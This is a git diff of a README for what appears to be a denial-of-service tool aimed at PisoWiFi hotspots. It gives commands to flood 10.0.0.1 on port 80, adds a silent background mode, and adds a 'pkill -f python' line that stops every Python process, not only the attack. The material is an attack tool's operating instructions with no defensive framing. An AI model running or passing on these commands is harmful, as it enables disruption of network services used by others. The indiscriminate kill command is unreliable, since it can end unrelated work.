@@ -36,10 +36,15 @@ cd ~/pisowifi-ddos
 ```
 python ddos.py -s 10.0.0.1 -p 80 -t 135
 ```
+### Alternative 
 > Background mode
 
 ```
-python ddos.py -s 10.0.0.1 -p 80 -t 135 2>&1 &
+python ddos.py -s 10.0.0.1 -p 80 -t 135 >  /dev/null 2>&1 &
+```
+> To kill the process
+```
+pkill -f python
 ```
 
 <div align="center">
